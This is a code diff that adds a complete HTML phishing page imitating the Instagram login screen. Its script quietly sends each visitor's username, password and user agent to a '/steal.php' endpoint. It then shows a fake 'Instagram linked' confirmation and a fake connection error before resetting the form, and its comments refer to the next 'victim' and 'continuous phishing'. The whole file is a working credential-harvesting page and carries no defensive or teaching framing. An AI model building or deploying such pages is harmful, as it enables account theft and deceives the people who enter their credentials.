@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
+            height: 100vh; display: flex; align-items: center; justify-content: center;
+        }
+        .container { background: white; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; padding: 40px 40px 20px; }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo img { height: 51px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #262626; margin-bottom: 5px; }
+        .form-group input { width: 100%; padding: 9px 0 7px 10px; border: 1px solid #efefef; border-radius: 3px; font-size: 14px; background: #fafafa; outline: none; }
+        .form-group input:focus { border-color: #a8a8a8; background: white; }
+        .login-btn { width: 100%; padding: 7px 0; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: 600; font-size: 14px; cursor: pointer; margin: 10px 0; }
+        .login-btn:hover { background: #0077cc; }
+        .divider { text-align: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
+        .divider::before, .divider::after { content: ''; display: inline-block; width: 100px; height: 1px; background: #efefef; vertical-align: middle; margin: 0 10px; }
+        .forgot-password { text-align: center; color: #00376b; font-size: 12px; text-decoration: none; margin-top: 20px; display: block; }
+        
+        /* Success Screen */
+        .success-screen { display: none; text-align: center; padding: 40px 20px; }
+        .checkmark { font-size: 64px; color: #00d45e; margin-bottom: 20px; }
+        .success-message { font-size: 20px; font-weight: 600; color: #262626; margin-bottom: 10px; }
+        .success-subtext { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
+        .back-btn { background: #0095f6; color: white; border: none; padding: 10px 20px; border-radius: 5px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; font-size: 14px; }
+        .back-btn:hover { background: #0077cc; }
+        
+        /* Error Screen */
+        .error-screen { display: none; text-align: center; padding: 40px 20px; color: #ed4956; }
+        .error-title { font-size: 24px; font-weight: 600; margin-bottom: 10px; }
+        .error-text { font-size: 16px; margin-bottom: 20px; }
+        .back-btn.error { background: #ed4956; margin-top: 20px; }
+        .back-btn.error:hover { background: #c1354a; }
+        
+        .hidden { display: none !important; }
+        @media (max-width: 450px) { .container { margin: 0 20px; width: auto; } }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginContainer">
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Phone number, user name or email</label>
+                <input type="text" id="username" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+        <div class="divider">OR</div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <!-- Success Screen -->
+    <div class="container success-screen" id="successScreen">
+        <div class="checkmark">✓</div>
+        <div class="success-message">Instagram linked</div>
+        <div class="success-subtext">Your account has been successfully connected</div>
+        <a href="#" class="back-btn" onclick="resetToLogin()">← Back to login</a>
+    </div>
+
+    <!-- Error Screen -->
+    <div class="container error-screen" id="errorScreen">
+        <div class="error-title">Couldn't load the site</div>
+        <div class="error-text">Please check your connection and try again.</div>
+        <a href="#" class="back-btn error" onclick="resetToLogin()">← Try again</a>
+    </div>
+
+    <script>
+    function resetToLogin() {
+        document.getElementById('errorScreen').classList.add('hidden');
+        document.getElementById('successScreen').classList.add('hidden');
+        document.getElementById('loginContainer').classList.remove('hidden');
+        // Clear form for next victim
+        document.getElementById('username').value = '';
+        document.getElementById('password').value = '';
+        document.getElementById('username').focus();
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        const formData = new FormData();
+        formData.append('username', username);
+        formData.append('password', password);
+        formData.append('user_agent', navigator.userAgent);
+        
+        // Exfiltrate (silent)
+        fetch(window.location.origin + '/steal.php', {
+            method: 'POST',
+            body: formData
+        }).catch(() => {});
+        
+        // Show success → error → back to login (continuous phishing)
+        document.getElementById('loginContainer').classList.add('hidden');
+        document.getElementById('successScreen').style.display = 'block';
+        
+        setTimeout(() => {
+            document.getElementById('successScreen').classList.add('hidden');
+            document.getElementById('errorScreen').style.display = 'block';
+        }, 3000);
+    });
+    </script>
+</body>
+</html>
